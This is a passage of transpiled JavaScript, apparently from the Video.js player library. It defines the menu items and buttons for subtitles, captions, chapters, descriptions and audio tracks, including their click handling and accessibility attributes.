    classCallCheck(this, MenuItem);

    var _this = possibleConstructorReturn(this, _ClickableComponent.call(this, player, options));

    _this.selectable = options.selectable;
    _this.isSelected_ = options.selected || false;
    _this.multiSelectable = options.multiSelectable;

    _this.selected(_this.isSelected_);

    if (_this.selectable) {
      if (_this.multiSelectable) {
        _this.el_.setAttribute('role', 'menuitemcheckbox');
      } else {
        _this.el_.setAttribute('role', 'menuitemradio');
      }
    } else {
      _this.el_.setAttribute('role', 'menuitem');
    }
    return _this;
  }

  /**
   * Create the `MenuItem's DOM element
   *
   * @param {string} [type=li]
   *        Element's node type, not actually used, always set to `li`.
   *
   * @param {Object} [props={}]
   *        An object of properties that should be set on the element
   *
   * @param {Object} [attrs={}]
   *        An object of attributes that should be set on the element
   *
   * @return {Element}
   *         The element that gets created.
   */


  MenuItem.prototype.createEl = function createEl(type, props, attrs) {
    // The control is textual, not just an icon
    this.nonIconControl = true;

    return _ClickableComponent.prototype.createEl.call(this, 'li', assign({
      className: 'vjs-menu-item',
      innerHTML: '<span class="vjs-menu-item-text">' + this.localize(this.options_.label) + '</span>',
      tabIndex: -1
    }, props), attrs);
  };

  /**
   * Any click on a `MenuItem` puts it into the selected state.
   * See {@link ClickableComponent#handleClick} for instances where this is called.
   *
   * @param {EventTarget~Event} event
   *        The `keydown`, `tap`, or `click` event that caused this function to be
   *        called.
   *
   * @listens tap
   * @listens click
   */


  MenuItem.prototype.handleClick = function handleClick(event) {
    this.selected(true);
  };

  /**
   * Set the state for this menu item as selected or not.
   *
   * @param {boolean} selected
   *        if the menu item is selected or not
   */


  MenuItem.prototype.selected = function selected(_selected) {
    if (this.selectable) {
      if (_selected) {
        this.addClass('vjs-selected');
        this.el_.setAttribute('aria-checked', 'true');
        // aria-checked isn't fully supported by browsers/screen readers,
        // so indicate selected state to screen reader in the control text.
        this.controlText(', selected');
        this.isSelected_ = true;
      } else {
        this.removeClass('vjs-selected');
        this.el_.setAttribute('aria-checked', 'false');
        // Indicate un-selected state to screen reader
        this.controlText('');
        this.isSelected_ = false;
      }
    }
  };

  return MenuItem;
}(ClickableComponent);

Component.registerComponent('MenuItem', MenuItem);

/**
 * @file text-track-menu-item.js
 */
/**
 * The specific menu item type for selecting a language within a text track kind
 *
 * @extends MenuItem
 */

var TextTrackMenuItem = function (_MenuItem) {
  inherits(TextTrackMenuItem, _MenuItem);

  /**
   * Creates an instance of this class.
   *
   * @param {Player} player
   *        The `Player` that this class should be attached to.
   *
   * @param {Object} [options]
   *        The key/value store of player options.
   */
  function TextTrackMenuItem(player, options) {
    classCallCheck(this, TextTrackMenuItem);

    var track = options.track;
    var tracks = player.textTracks();

    // Modify options for parent MenuItem class's init.
    options.label = track.label || track.language || 'Unknown';
    options.selected = track.mode === 'showing';

    var _this = possibleConstructorReturn(this, _MenuItem.call(this, player, options));

    _this.track = track;
    var changeHandler = function changeHandler() {
      for (var _len = arguments.length, args = Array(_len), _key = 0; _key < _len; _key++) {
        args[_key] = arguments[_key];
      }

      _this.handleTracksChange.apply(_this, args);
    };
    var selectedLanguageChangeHandler = function selectedLanguageChangeHandler() {
      for (var _len2 = arguments.length, args = Array(_len2), _key2 = 0; _key2 < _len2; _key2++) {
        args[_key2] = arguments[_key2];
      }

      _this.handleSelectedLanguageChange.apply(_this, args);
    };

    player.on(['loadstart', 'texttrackchange'], changeHandler);
    tracks.addEventListener('change', changeHandler);
    tracks.addEventListener('selectedlanguagechange', selectedLanguageChangeHandler);
    _this.on('dispose', function () {
      player.off(['loadstart', 'texttrackchange'], changeHandler);
      tracks.removeEventListener('change', changeHandler);
      tracks.removeEventListener('selectedlanguagechange', selectedLanguageChangeHandler);
    });

    // iOS7 doesn't dispatch change events to TextTrackLists when an
    // associated track's mode changes. Without something like
    // Object.observe() (also not present on iOS7), it's not
    // possible to detect changes to the mode attribute and polyfill
    // the change event. As a poor substitute, we manually dispatch
    // change events whenever the controls modify the mode.
    if (tracks.onchange === undefined) {
      var event = void 0;

      _this.on(['tap', 'click'], function () {
        if (_typeof(window_1.Event) !== 'object') {
          // Android 2.3 throws an Illegal Constructor error for window.Event
          try {
            event = new window_1.Event('change');
          } catch (err) {
            // continue regardless of error
          }
        }

        if (!event) {
          event = document_1.createEvent('Event');
          event.initEvent('change', true, true);
        }

        tracks.dispatchEvent(event);
      });
    }

    // set the default state based on current tracks
    _this.handleTracksChange();
    return _this;
  }

  /**
   * This gets called when an `TextTrackMenuItem` is "clicked". See
   * {@link ClickableComponent} for more detailed information on what a click can be.
   *
   * @param {EventTarget~Event} event
   *        The `keydown`, `tap`, or `click` event that caused this function to be
   *        called.
   *
   * @listens tap
   * @listens click
   */


  TextTrackMenuItem.prototype.handleClick = function handleClick(event) {
    var kind = this.track.kind;
    var kinds = this.track.kinds;
    var tracks = this.player_.textTracks();

    if (!kinds) {
      kinds = [kind];
    }

    _MenuItem.prototype.handleClick.call(this, event);

    if (!tracks) {
      return;
    }

    for (var i = 0; i < tracks.length; i++) {
      var track = tracks[i];

      if (track === this.track && kinds.indexOf(track.kind) > -1) {
        if (track.mode !== 'showing') {
          track.mode = 'showing';
        }
      } else if (track.mode !== 'disabled') {
        track.mode = 'disabled';
      }
    }
  };

  /**
   * Handle text track list change
   *
   * @param {EventTarget~Event} event
   *        The `change` event that caused this function to be called.
   *
   * @listens TextTrackList#change
   */


  TextTrackMenuItem.prototype.handleTracksChange = function handleTracksChange(event) {
    var shouldBeSelected = this.track.mode === 'showing';

    // Prevent redundant selected() calls because they may cause
    // screen readers to read the appended control text unnecessarily
    if (shouldBeSelected !== this.isSelected_) {
      this.selected(shouldBeSelected);
    }
  };

  TextTrackMenuItem.prototype.handleSelectedLanguageChange = function handleSelectedLanguageChange(event) {
    if (this.track.mode === 'showing') {
      var selectedLanguage = this.player_.cache_.selectedLanguage;

      // Don't replace the kind of track across the same language
      if (selectedLanguage && selectedLanguage.enabled && selectedLanguage.language === this.track.language && selectedLanguage.kind !== this.track.kind) {
        return;
      }

      this.player_.cache_.selectedLanguage = {
        enabled: true,
        language: this.track.language,
        kind: this.track.kind
      };
    }
  };

  TextTrackMenuItem.prototype.dispose = function dispose() {
    // remove reference to track object on dispose
    this.track = null;

    _MenuItem.prototype.dispose.call(this);
  };

  return TextTrackMenuItem;
}(MenuItem);

Component.registerComponent('TextTrackMenuItem', TextTrackMenuItem);

/**
 * @file off-text-track-menu-item.js
 */
/**
 * A special menu item for turning of a specific type of text track
 *
 * @extends TextTrackMenuItem
 */

var OffTextTrackMenuItem = function (_TextTrackMenuItem) {
  inherits(OffTextTrackMenuItem, _TextTrackMenuItem);

  /**
   * Creates an instance of this class.
   *
   * @param {Player} player
   *        The `Player` that this class should be attached to.
   *
   * @param {Object} [options]
   *        The key/value store of player options.
   */
  function OffTextTrackMenuItem(player, options) {
    classCallCheck(this, OffTextTrackMenuItem);

    // Create pseudo track info
    // Requires options['kind']
    options.track = {
      player: player,
      kind: options.kind,
      kinds: options.kinds,
      'default': false,
      mode: 'disabled'
    };

    if (!options.kinds) {
      options.kinds = [options.kind];
    }

    if (options.label) {
      options.track.label = options.label;
    } else {
      options.track.label = options.kinds.join(' and ') + ' off';
    }

    // MenuItem is selectable
    options.selectable = true;
    // MenuItem is NOT multiSelectable (i.e. only one can be marked "selected" at a time)
    options.multiSelectable = false;

    return possibleConstructorReturn(this, _TextTrackMenuItem.call(this, player, options));
  }

  /**
   * Handle text track change
   *
   * @param {EventTarget~Event} event
   *        The event that caused this function to run
   */


  OffTextTrackMenuItem.prototype.handleTracksChange = function handleTracksChange(event) {
    var tracks = this.player().textTracks();
    var shouldBeSelected = true;

    for (var i = 0, l = tracks.length; i < l; i++) {
      var track = tracks[i];

      if (this.options_.kinds.indexOf(track.kind) > -1 && track.mode === 'showing') {
        shouldBeSelected = false;
        break;
      }
    }

    // Prevent redundant selected() calls because they may cause
    // screen readers to read the appended control text unnecessarily
    if (shouldBeSelected !== this.isSelected_) {
      this.selected(shouldBeSelected);
    }
  };

  OffTextTrackMenuItem.prototype.handleSelectedLanguageChange = function handleSelectedLanguageChange(event) {
    var tracks = this.player().textTracks();
    var allHidden = true;

    for (var i = 0, l = tracks.length; i < l; i++) {
      var track = tracks[i];

      if (['captions', 'descriptions', 'subtitles'].indexOf(track.kind) > -1 && track.mode === 'showing') {
        allHidden = false;
        break;
      }
    }

    if (allHidden) {
      this.player_.cache_.selectedLanguage = {
        enabled: false
      };
    }
  };

  return OffTextTrackMenuItem;
}(TextTrackMenuItem);

Component.registerComponent('OffTextTrackMenuItem', OffTextTrackMenuItem);

/**
 * @file text-track-button.js
 */
/**
 * The base class for buttons that toggle specific text track types (e.g. subtitles)
 *
 * @extends MenuButton
 */

var TextTrackButton = function (_TrackButton) {
  inherits(TextTrackButton, _TrackButton);

  /**
   * Creates an instance of this class.
   *
   * @param {Player} player
   *        The `Player` that this class should be attached to.
   *
   * @param {Object} [options={}]
   *        The key/value store of player options.
   */
  function TextTrackButton(player) {
    var options = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : {};
    classCallCheck(this, TextTrackButton);

    options.tracks = player.textTracks();

    return possibleConstructorReturn(this, _TrackButton.call(this, player, options));
  }

  /**
   * Create a menu item for each text track
   *
   * @param {TextTrackMenuItem[]} [items=[]]
   *        Existing array of items to use during creation
   *
   * @return {TextTrackMenuItem[]}
   *         Array of menu items that were created
   */


  TextTrackButton.prototype.createItems = function createItems() {
    var items = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : [];
    var TrackMenuItem = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : TextTrackMenuItem;


    // Label is an overide for the [track] off label
    // USed to localise captions/subtitles
    var label = void 0;

    if (this.label_) {
      label = this.label_ + ' off';
    }
    // Add an OFF menu item to turn all tracks off
    items.push(new OffTextTrackMenuItem(this.player_, {
      kinds: this.kinds_,
      kind: this.kind_,
      label: label
    }));

    this.hideThreshold_ += 1;

    var tracks = this.player_.textTracks();

    if (!Array.isArray(this.kinds_)) {
      this.kinds_ = [this.kind_];
    }

    for (var i = 0; i < tracks.length; i++) {
      var track = tracks[i];

      // only add tracks that are of an appropriate kind and have a label
      if (this.kinds_.indexOf(track.kind) > -1) {

        var item = new TrackMenuItem(this.player_, {
          track: track,
          // MenuItem is selectable
          selectable: true,
          // MenuItem is NOT multiSelectable (i.e. only one can be marked "selected" at a time)
          multiSelectable: false
        });

        item.addClass('vjs-' + track.kind + '-menu-item');
        items.push(item);
      }
    }

    return items;
  };

  return TextTrackButton;
}(TrackButton);

Component.registerComponent('TextTrackButton', TextTrackButton);

/**
 * @file chapters-track-menu-item.js
 */
/**
 * The chapter track menu item
 *
 * @extends MenuItem
 */

var ChaptersTrackMenuItem = function (_MenuItem) {
  inherits(ChaptersTrackMenuItem, _MenuItem);

  /**
   * Creates an instance of this class.
   *
   * @param {Player} player
   *        The `Player` that this class should be attached to.
   *
   * @param {Object} [options]
   *        The key/value store of player options.
   */
  function ChaptersTrackMenuItem(player, options) {
    classCallCheck(this, ChaptersTrackMenuItem);

    var track = options.track;
    var cue = options.cue;
    var currentTime = player.currentTime();

    // Modify options for parent MenuItem class's init.
    options.selectable = true;
    options.multiSelectable = false;
    options.label = cue.text;
    options.selected = cue.startTime <= currentTime && currentTime < cue.endTime;

    var _this = possibleConstructorReturn(this, _MenuItem.call(this, player, options));

    _this.track = track;
    _this.cue = cue;
    track.addEventListener('cuechange', bind(_this, _this.update));
    return _this;
  }

  /**
   * This gets called when an `ChaptersTrackMenuItem` is "clicked". See
   * {@link ClickableComponent} for more detailed information on what a click can be.
   *
   * @param {EventTarget~Event} [event]
   *        The `keydown`, `tap`, or `click` event that caused this function to be
   *        called.
   *
   * @listens tap
   * @listens click
   */


  ChaptersTrackMenuItem.prototype.handleClick = function handleClick(event) {
    _MenuItem.prototype.handleClick.call(this);
    this.player_.currentTime(this.cue.startTime);
    this.update(this.cue.startTime);
  };

  /**
   * Update chapter menu item
   *
   * @param {EventTarget~Event} [event]
   *        The `cuechange` event that caused this function to run.
   *
   * @listens TextTrack#cuechange
   */


  ChaptersTrackMenuItem.prototype.update = function update(event) {
    var cue = this.cue;
    var currentTime = this.player_.currentTime();

    // vjs.log(currentTime, cue.startTime);
    this.selected(cue.startTime <= currentTime && currentTime < cue.endTime);
  };

  return ChaptersTrackMenuItem;
}(MenuItem);

Component.registerComponent('ChaptersTrackMenuItem', ChaptersTrackMenuItem);

/**
 * @file chapters-button.js
 */
/**
 * The button component for toggling and selecting chapters
 * Chapters act much differently than other text tracks
 * Cues are navigation vs. other tracks of alternative languages
 *
 * @extends TextTrackButton
 */

var ChaptersButton = function (_TextTrackButton) {
  inherits(ChaptersButton, _TextTrackButton);

  /**
   * Creates an instance of this class.
   *
   * @param {Player} player
   *        The `Player` that this class should be attached to.
   *
   * @param {Object} [options]
   *        The key/value store of player options.
   *
   * @param {Component~ReadyCallback} [ready]
   *        The function to call when this function is ready.
   */
  function ChaptersButton(player, options, ready) {
    classCallCheck(this, ChaptersButton);
    return possibleConstructorReturn(this, _TextTrackButton.call(this, player, options, ready));
  }

  /**
   * Builds the default DOM `className`.
   *
   * @return {string}
   *         The DOM `className` for this object.
   */


  ChaptersButton.prototype.buildCSSClass = function buildCSSClass() {
    return 'vjs-chapters-button ' + _TextTrackButton.prototype.buildCSSClass.call(this);
  };

  ChaptersButton.prototype.buildWrapperCSSClass = function buildWrapperCSSClass() {
    return 'vjs-chapters-button ' + _TextTrackButton.prototype.buildWrapperCSSClass.call(this);
  };

  /**
   * Update the menu based on the current state of its items.
   *
   * @param {EventTarget~Event} [event]
   *        An event that triggered this function to run.
   *
   * @listens TextTrackList#addtrack
   * @listens TextTrackList#removetrack
   * @listens TextTrackList#change
   */


  ChaptersButton.prototype.update = function update(event) {
    if (!this.track_ || event && (event.type === 'addtrack' || event.type === 'removetrack')) {
      this.setTrack(this.findChaptersTrack());
    }
    _TextTrackButton.prototype.update.call(this);
  };

  /**
   * Set the currently selected track for the chapters button.
   *
   * @param {TextTrack} track
   *        The new track to select. Nothing will change if this is the currently selected
   *        track.
   */


  ChaptersButton.prototype.setTrack = function setTrack(track) {
    if (this.track_ === track) {
      return;
    }

    if (!this.updateHandler_) {
      this.updateHandler_ = this.update.bind(this);
    }

    // here this.track_ refers to the old track instance
    if (this.track_) {
      var remoteTextTrackEl = this.player_.remoteTextTrackEls().getTrackElementByTrack_(this.track_);

      if (remoteTextTrackEl) {
        remoteTextTrackEl.removeEventListener('load', this.updateHandler_);
      }

      this.track_ = null;
    }

    this.track_ = track;

    // here this.track_ refers to the new track instance
    if (this.track_) {
      this.track_.mode = 'hidden';

      var _remoteTextTrackEl = this.player_.remoteTextTrackEls().getTrackElementByTrack_(this.track_);

      if (_remoteTextTrackEl) {
        _remoteTextTrackEl.addEventListener('load', this.updateHandler_);
      }
    }
  };

  /**
   * Find the track object that is currently in use by this ChaptersButton
   *
   * @return {TextTrack|undefined}
   *         The current track or undefined if none was found.
   */


  ChaptersButton.prototype.findChaptersTrack = function findChaptersTrack() {
    var tracks = this.player_.textTracks() || [];

    for (var i = tracks.length - 1; i >= 0; i--) {
      // We will always choose the last track as our chaptersTrack
      var track = tracks[i];

      if (track.kind === this.kind_) {
        return track;
      }
    }
  };

  /**
   * Get the caption for the ChaptersButton based on the track label. This will also
   * use the current tracks localized kind as a fallback if a label does not exist.
   *
   * @return {string}
   *         The tracks current label or the localized track kind.
   */


  ChaptersButton.prototype.getMenuCaption = function getMenuCaption() {
    if (this.track_ && this.track_.label) {
      return this.track_.label;
    }
    return this.localize(toTitleCase(this.kind_));
  };

  /**
   * Create menu from chapter track
   *
   * @return {Menu}
   *         New menu for the chapter buttons
   */


  ChaptersButton.prototype.createMenu = function createMenu() {
    this.options_.title = this.getMenuCaption();
    return _TextTrackButton.prototype.createMenu.call(this);
  };

  /**
   * Create a menu item for each text track
   *
   * @return {TextTrackMenuItem[]}
   *         Array of menu items
   */


  ChaptersButton.prototype.createItems = function createItems() {
    var items = [];

    if (!this.track_) {
      return items;
    }

    var cues = this.track_.cues;

    if (!cues) {
      return items;
    }

    for (var i = 0, l = cues.length; i < l; i++) {
      var cue = cues[i];
      var mi = new ChaptersTrackMenuItem(this.player_, { track: this.track_, cue: cue });

      items.push(mi);
    }

    return items;
  };

  return ChaptersButton;
}(TextTrackButton);

/**
 * `kind` of TextTrack to look for to associate it with this menu.
 *
 * @type {string}
 * @private
 */


ChaptersButton.prototype.kind_ = 'chapters';

/**
 * The text that should display over the `ChaptersButton`s controls. Added for localization.
 *
 * @type {string}
 * @private
 */
ChaptersButton.prototype.controlText_ = 'Chapters';

Component.registerComponent('ChaptersButton', ChaptersButton);

/**
 * @file descriptions-button.js
 */
/**
 * The button component for toggling and selecting descriptions
 *
 * @extends TextTrackButton
 */

var DescriptionsButton = function (_TextTrackButton) {
  inherits(DescriptionsButton, _TextTrackButton);

  /**
   * Creates an instance of this class.
   *
   * @param {Player} player
   *        The `Player` that this class should be attached to.
   *
   * @param {Object} [options]
   *        The key/value store of player options.
   *
   * @param {Component~ReadyCallback} [ready]
   *        The function to call when this component is ready.
   */
  function DescriptionsButton(player, options, ready) {
    classCallCheck(this, DescriptionsButton);

    var _this = possibleConstructorReturn(this, _TextTrackButton.call(this, player, options, ready));

    var tracks = player.textTracks();
    var changeHandler = bind(_this, _this.handleTracksChange);

    tracks.addEventListener('change', changeHandler);
    _this.on('dispose', function () {
      tracks.removeEventListener('change', changeHandler);
    });
    return _this;
  }

  /**
   * Handle text track change
   *
   * @param {EventTarget~Event} event
   *        The event that caused this function to run
   *
   * @listens TextTrackList#change
   */


  DescriptionsButton.prototype.handleTracksChange = function handleTracksChange(event) {
    var tracks = this.player().textTracks();
    var disabled = false;

    // Check whether a track of a different kind is showing
    for (var i = 0, l = tracks.length; i < l; i++) {
      var track = tracks[i];

      if (track.kind !== this.kind_ && track.mode === 'showing') {
        disabled = true;
        break;
      }
    }

    // If another track is showing, disable this menu button
    if (disabled) {
      this.disable();
    } else {
      this.enable();
    }
  };

  /**
   * Builds the default DOM `className`.
   *
   * @return {string}
   *         The DOM `className` for this object.
   */


  DescriptionsButton.prototype.buildCSSClass = function buildCSSClass() {
    return 'vjs-descriptions-button ' + _TextTrackButton.prototype.buildCSSClass.call(this);
  };

  DescriptionsButton.prototype.buildWrapperCSSClass = function buildWrapperCSSClass() {
    return 'vjs-descriptions-button ' + _TextTrackButton.prototype.buildWrapperCSSClass.call(this);
  };

  return DescriptionsButton;
}(TextTrackButton);

/**
 * `kind` of TextTrack to look for to associate it with this menu.
 *
 * @type {string}
 * @private
 */


DescriptionsButton.prototype.kind_ = 'descriptions';

/**
 * The text that should display over the `DescriptionsButton`s controls. Added for localization.
 *
 * @type {string}
 * @private
 */
DescriptionsButton.prototype.controlText_ = 'Descriptions';

Component.registerComponent('DescriptionsButton', DescriptionsButton);

/**
 * @file subtitles-button.js
 */
/**
 * The button component for toggling and selecting subtitles
 *
 * @extends TextTrackButton
 */

var SubtitlesButton = function (_TextTrackButton) {
  inherits(SubtitlesButton, _TextTrackButton);

  /**
   * Creates an instance of this class.
   *
   * @param {Player} player
   *        The `Player` that this class should be attached to.
   *
   * @param {Object} [options]
   *        The key/value store of player options.
   *
   * @param {Component~ReadyCallback} [ready]
   *        The function to call when this component is ready.
   */
  function SubtitlesButton(player, options, ready) {
    classCallCheck(this, SubtitlesButton);
    return possibleConstructorReturn(this, _TextTrackButton.call(this, player, options, ready));
  }

  /**
   * Builds the default DOM `className`.
   *
   * @return {string}
   *         The DOM `className` for this object.
   */


  SubtitlesButton.prototype.buildCSSClass = function buildCSSClass() {
    return 'vjs-subtitles-button ' + _TextTrackButton.prototype.buildCSSClass.call(this);
  };

  SubtitlesButton.prototype.buildWrapperCSSClass = function buildWrapperCSSClass() {
    return 'vjs-subtitles-button ' + _TextTrackButton.prototype.buildWrapperCSSClass.call(this);
  };

  return SubtitlesButton;
}(TextTrackButton);

/**
 * `kind` of TextTrack to look for to associate it with this menu.
 *
 * @type {string}
 * @private
 */


SubtitlesButton.prototype.kind_ = 'subtitles';

/**
 * The text that should display over the `SubtitlesButton`s controls. Added for localization.
 *
 * @type {string}
 * @private
 */
SubtitlesButton.prototype.controlText_ = 'Subtitles';

Component.registerComponent('SubtitlesButton', SubtitlesButton);

/**
 * @file caption-settings-menu-item.js
 */
/**
 * The menu item for caption track settings menu
 *
 * @extends TextTrackMenuItem
 */

var CaptionSettingsMenuItem = function (_TextTrackMenuItem) {
  inherits(CaptionSettingsMenuItem, _TextTrackMenuItem);

  /**
   * Creates an instance of this class.
   *
   * @param {Player} player
   *        The `Player` that this class should be attached to.
   *
   * @param {Object} [options]
   *        The key/value store of player options.
   */
  function CaptionSettingsMenuItem(player, options) {
    classCallCheck(this, CaptionSettingsMenuItem);

    options.track = {
      player: player,
      kind: options.kind,
      label: options.kind + ' settings',
      selectable: false,
      'default': false,
      mode: 'disabled'
    };

    // CaptionSettingsMenuItem has no concept of 'selected'
    options.selectable = false;

    options.name = 'CaptionSettingsMenuItem';

    var _this = possibleConstructorReturn(this, _TextTrackMenuItem.call(this, player, options));

    _this.addClass('vjs-texttrack-settings');
    _this.controlText(', opens ' + options.kind + ' settings dialog');
    return _this;
  }

  /**
   * This gets called when an `CaptionSettingsMenuItem` is "clicked". See
   * {@link ClickableComponent} for more detailed information on what a click can be.
   *
   * @param {EventTarget~Event} [event]
   *        The `keydown`, `tap`, or `click` event that caused this function to be
   *        called.
   *
   * @listens tap
   * @listens click
   */


  CaptionSettingsMenuItem.prototype.handleClick = function handleClick(event) {
    this.player().getChild('textTrackSettings').open();
  };

  return CaptionSettingsMenuItem;
}(TextTrackMenuItem);

Component.registerComponent('CaptionSettingsMenuItem', CaptionSettingsMenuItem);

/**
 * @file captions-button.js
 */
/**
 * The button component for toggling and selecting captions
 *
 * @extends TextTrackButton
 */

var CaptionsButton = function (_TextTrackButton) {
  inherits(CaptionsButton, _TextTrackButton);

  /**
   * Creates an instance of this class.
   *
   * @param {Player} player
   *        The `Player` that this class should be attached to.
   *
   * @param {Object} [options]
   *        The key/value store of player options.
   *
   * @param {Component~ReadyCallback} [ready]
   *        The function to call when this component is ready.
   */
  function CaptionsButton(player, options, ready) {
    classCallCheck(this, CaptionsButton);
    return possibleConstructorReturn(this, _TextTrackButton.call(this, player, options, ready));
  }

  /**
   * Builds the default DOM `className`.
   *
   * @return {string}
   *         The DOM `className` for this object.
   */


  CaptionsButton.prototype.buildCSSClass = function buildCSSClass() {
    return 'vjs-captions-button ' + _TextTrackButton.prototype.buildCSSClass.call(this);
  };

  CaptionsButton.prototype.buildWrapperCSSClass = function buildWrapperCSSClass() {
    return 'vjs-captions-button ' + _TextTrackButton.prototype.buildWrapperCSSClass.call(this);
  };

  /**
   * Create caption menu items
   *
   * @return {CaptionSettingsMenuItem[]}
   *         The array of current menu items.
   */


  CaptionsButton.prototype.createItems = function createItems() {
    var items = [];

    if (!(this.player().tech_ && this.player().tech_.featuresNativeTextTracks) && this.player().getChild('textTrackSettings')) {
      items.push(new CaptionSettingsMenuItem(this.player_, { kind: this.kind_ }));

      this.hideThreshold_ += 1;
    }

    return _TextTrackButton.prototype.createItems.call(this, items);
  };

  return CaptionsButton;
}(TextTrackButton);

/**
 * `kind` of TextTrack to look for to associate it with this menu.
 *
 * @type {string}
 * @private
 */


CaptionsButton.prototype.kind_ = 'captions';

/**
 * The text that should display over the `CaptionsButton`s controls. Added for localization.
 *
 * @type {string}
 * @private
 */
CaptionsButton.prototype.controlText_ = 'Captions';

Component.registerComponent('CaptionsButton', CaptionsButton);

/**
 * @file subs-caps-menu-item.js
 */
/**
 * SubsCapsMenuItem has an [cc] icon to distinguish captions from subtitles
 * in the SubsCapsMenu.
 *
 * @extends TextTrackMenuItem
 */

var SubsCapsMenuItem = function (_TextTrackMenuItem) {
  inherits(SubsCapsMenuItem, _TextTrackMenuItem);

  function SubsCapsMenuItem() {
    classCallCheck(this, SubsCapsMenuItem);
    return possibleConstructorReturn(this, _TextTrackMenuItem.apply(this, arguments));
  }

  SubsCapsMenuItem.prototype.createEl = function createEl(type, props, attrs) {
    var innerHTML = '<span class="vjs-menu-item-text">' + this.localize(this.options_.label);

    if (this.options_.track.kind === 'captions') {
      innerHTML += '\n        <span aria-hidden="true" class="vjs-icon-placeholder"></span>\n        <span class="vjs-control-text"> ' + this.localize('Captions') + '</span>\n      ';
    }

    innerHTML += '</span>';

    var el = _TextTrackMenuItem.prototype.createEl.call(this, type, assign({
      innerHTML: innerHTML
    }, props), attrs);

    return el;
  };

  return SubsCapsMenuItem;
}(TextTrackMenuItem);

Component.registerComponent('SubsCapsMenuItem', SubsCapsMenuItem);

/**
 * @file sub-caps-button.js
 */
/**
 * The button component for toggling and selecting captions and/or subtitles
 *
 * @extends TextTrackButton
 */

var SubsCapsButton = function (_TextTrackButton) {
  inherits(SubsCapsButton, _TextTrackButton);

  function SubsCapsButton(player) {
    var options = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : {};
    classCallCheck(this, SubsCapsButton);

    // Although North America uses "captions" in most cases for
    // "captions and subtitles" other locales use "subtitles"
    var _this = possibleConstructorReturn(this, _TextTrackButton.call(this, player, options));

    _this.label_ = 'subtitles';
    if (['en', 'en-us', 'en-ca', 'fr-ca'].indexOf(_this.player_.language_) > -1) {
      _this.label_ = 'captions';
    }
    _this.menuButton_.controlText(toTitleCase(_this.label_));
    return _this;
  }

  /**
   * Builds the default DOM `className`.
   *
   * @return {string}
   *         The DOM `className` for this object.
   */


  SubsCapsButton.prototype.buildCSSClass = function buildCSSClass() {
    return 'vjs-subs-caps-button ' + _TextTrackButton.prototype.buildCSSClass.call(this);
  };

  SubsCapsButton.prototype.buildWrapperCSSClass = function buildWrapperCSSClass() {
    return 'vjs-subs-caps-button ' + _TextTrackButton.prototype.buildWrapperCSSClass.call(this);
  };

  /**
   * Create caption/subtitles menu items
   *
   * @return {CaptionSettingsMenuItem[]}
   *         The array of current menu items.
   */


  SubsCapsButton.prototype.createItems = function createItems() {
    var items = [];

    if (!(this.player().tech_ && this.player().tech_.featuresNativeTextTracks) && this.player().getChild('textTrackSettings')) {
      items.push(new CaptionSettingsMenuItem(this.player_, { kind: this.label_ }));

      this.hideThreshold_ += 1;
    }

    items = _TextTrackButton.prototype.createItems.call(this, items, SubsCapsMenuItem);
    return items;
  };

  return SubsCapsButton;
}(TextTrackButton);

/**
 * `kind`s of TextTrack to look for to associate it with this menu.
 *
 * @type {array}
 * @private
 */


SubsCapsButton.prototype.kinds_ = ['captions', 'subtitles'];

/**
 * The text that should display over the `SubsCapsButton`s controls.
 *
 *
 * @type {string}
 * @private
 */
SubsCapsButton.prototype.controlText_ = 'Subtitles';

Component.registerComponent('SubsCapsButton', SubsCapsButton);

/**
 * @file audio-track-menu-item.js
 */
/**
 * An {@link AudioTrack} {@link MenuItem}
 *
 * @extends MenuItem
 */

var AudioTrackMenuItem = function (_MenuItem) {
  inherits(AudioTrackMenuItem, _MenuItem);

  /**
   * Creates an instance of this class.
   *
   * @param {Player} player
   *        The `Player` that this class should be attached to.
   *
   * @param {Object} [options]
   *        The key/value store of player options.
   */
  function AudioTrackMenuItem(player, options) {
    classCallCheck(this, AudioTrackMenuItem);

    var track = options.track;
    var tracks = player.audioTracks();

    // Modify options for parent MenuItem class's init.
    options.label = track.label || track.language || 'Unknown';
    options.selected = track.enabled;

    var _this = possibleConstructorReturn(this, _MenuItem.call(this, player, options));

    _this.track = track;

    var changeHandler = function changeHandler() {
      for (var _len = arguments.length, args = Array(_len), _key = 0; _key < _len; _key++) {
        args[_key] = arguments[_key];
      }

      _this.handleTracksChange.apply(_this, args);
    };

    tracks.addEventListener('change', changeHandler);
    _this.on('dispose', function () {
      tracks.removeEventListener('change', changeHandler);
    });
    return _this;
  }

  /**
   * This gets called when an `AudioTrackMenuItem is "clicked". See {@link ClickableComponent}
   * for more detailed information on what a click can be.
   *
   * @param {EventTarget~Event} [event]
   *        The `keydown`, `tap`, or `click` event that caused this function to be
   *        called.
   *
   * @listens tap
   * @listens click
   */


  AudioTrackMenuItem.prototype.handleClick = function handleClick(event) {
    var tracks = this.player_.audioTracks();

    _MenuItem.prototype.handleClick.call(this, event);

    for (var i = 0; i < tracks.length; i++) {
      var track = tracks[i];

      track.enabled = track === this.track;
    }
  };

  /**
   * Handle any {@link AudioTrack} change.
   *
   * @param {EventTarget~Event} [event]
   *        The {@link AudioTrackList#change} event that caused this to run.
   *
   * @listens AudioTrackList#change
   */


  AudioTrackMenuItem.prototype.handleTracksChange = function handleTracksChange(event) {
    this.selected(this.track.enabled);
  };

  return AudioTrackMenuItem;
}(MenuItem);

Component.registerComponent('AudioTrackMenuItem', AudioTrackMenuItem);

/**
 * @file audio-track-button.js
 */
/**
 * The base class for buttons that toggle specific {@link AudioTrack} types.
 *
 * @extends TrackButton
 */

var AudioTrackButton = function (_TrackButton) {
  inherits(AudioTrackButton, _TrackButton);

  /**
   * Creates an instance of this class.
   *
   * @param {Player} player
   *        The `Player` that this class should be attached to.
   *
   * @param {Object} [options={}]
   *        The key/value store of player options.
   */
  function AudioTrackButton(player) {
    var options = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : {};
    classCallCheck(this, AudioTrackButton);

    options.tracks = player.audioTracks();

    return possibleConstructorReturn(this, _TrackButton.call(this, player, options));
  }

  /**
   * Builds the default DOM `className`.
   *
   * @return {string}
   *         The DOM `className` for this object.
   */


  AudioTrackButton.prototype.buildCSSClass = function buildCSSClass() {
    return 'vjs-audio-button ' + _TrackButton.prototype.buildCSSClass.call(this);
  };

  AudioTrackButton.prototype.buildWrapperCSSClass = function buildWrapperCSSClass() {
